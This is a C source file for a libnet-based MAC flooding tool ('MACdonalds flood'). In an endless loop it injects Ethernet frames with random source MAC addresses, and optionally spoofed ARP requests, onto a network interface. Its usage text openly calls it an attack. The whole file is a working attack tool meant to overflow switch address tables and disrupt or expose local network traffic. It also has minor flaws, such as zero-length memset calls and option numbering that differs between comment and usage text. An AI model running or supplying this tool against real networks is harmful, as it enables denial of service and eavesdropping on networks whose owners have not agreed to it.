#include <stdio.h>
#include <libnet.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include "../SEHT-Headers/exp.h"
#include "../SEHT-Headers/exp_libnetpcap.h"


int main(int argc, char* argv[])
{
	time_t tme;
	srand((unsigned int)time(&tme));

	printf("Welcome to MACdonalds flood (+.+) <Program by cyan55>\n\n----------------------------------------------\n\n");

	if(argc < 5)
		exp_error("Usage:\n\n<device> <interval> <three_octet_prefix> <broadcast_option>\n\n<device>: The device you would like to use for this attack\n<interval>: An interval in seconds to sleep for between packet injection or -1 for a continuous loop\n<ip_prefix>: A three octet prefix if your will use the ARP protocol with this attack, -1 if you want to send an ethernet packet without an upper layer protocol, -2 if you want to use broadcast addresses\n\n", EXP_EXIT_ERROR);

	int interval = atoi(argv[2]);

	char device[10];
	char errbuff[LIBNET_ERRBUF_SIZE];

	char ip_prefix[12];

	/*
	0=broadcast destinations only
	1=random_everything
	2=no_upperlayer protocol (ARP)
	*/
	int option = atoi(argv[4]);

	//Copy the IP prefix
	if(option != 2)
	{
		memset(ip_prefix, '\0', 0);
		strncpy(ip_prefix, argv[3], 12);
	}

	strncpy(device, argv[1], 10);
	libnet_t *lnet = libnet_init(LIBNET_LINK, device, errbuff);

	if(lnet == NULL)
		exp_error(errbuff, EXP_EXIT_ERROR);

	printf("Opened instance with device %s\n", device);

	//Seed prand
	int seed = libnet_seed_prand(lnet);
	int mac_addr_size = 17;

	//Set dest addr
	u_int8_t* dest_addr;
	u_int8_t* src_addr;

	struct exp_mac_addr mac_dst;
	struct exp_mac_addr mac_src;

	char src_ip_c[32];
	char dst_ip_c[32];

	u_int32_t src_ip;
	u_int32_t dst_ip;

	int n = 1;
	unsigned int protocol = 0x0000;

	while(0==0)
	{
		//Get random source MAC ADDR
		random_mac_address(&mac_src);

		//Get either a random or the broadcast MAC ADDR for the destination
		if(option == 1)
			random_mac_address(&mac_dst);
		else
			mac_address(&mac_dst, "ff:ff:ff:ff:ff:ff");

		//If upper layer option is set then add IP ADDR and ARP protocol
		if(option != 2)
		{
			protocol = 0x0806;
        	        memset(src_ip_c, '\0', 0);
	                memset(dst_ip_c, '\0', 0);

			//Add broadcast address or just a profixed address
        	        sprintf(src_ip_c, "%s%.2d", ip_prefix, (rand() % 255) + 1);

			//Destination IP as broadcast or as random
			if(option == 0)
	                	sprintf(dst_ip_c, "%s%.2d", ip_prefix, 255);
			else
				sprintf(dst_ip_c, "%s%.2d", ip_prefix, (rand() % 255) + 1);

                	src_ip = libnet_name2addr4(lnet, src_ip_c, LIBNET_DONT_RESOLVE);
        	        dst_ip = libnet_name2addr4(lnet, dst_ip_c, LIBNET_DONT_RESOLVE);

			//Build ARP header
			libnet_autobuild_arp(ARPOP_REQUEST, /*src_addr*/mac_src.mac_network, (u_int8_t*)(&src_ip), /*dest_addr*/mac_dst.mac_network, (u_int8_t*)(&dst_ip), lnet);
		}

		libnet_build_ethernet(/*dest_addr*/mac_dst.mac_network, /*src_addr*/mac_src.mac_network, protocol, NULL, 0, lnet, 0);
		libnet_open_link(lnet);
		if(libnet_write(lnet) == -1)
			exp_error("Could not write packet to the network", EXP_EXIT_NETWORK_WRITE_ERROR);
		libnet_close_link(lnet);

		if(interval != -1)
			sleep(interval);
		printf("[%d][OK] %s--->%s (%s--->%s)\n", n, mac_src.mac_string, mac_dst.mac_string, src_ip_c, dst_ip_c);
		libnet_clear_packet(lnet);
		n++;
	}
	libnet_destroy(lnet);
	return SC_EXIT_SUCCESS;
}
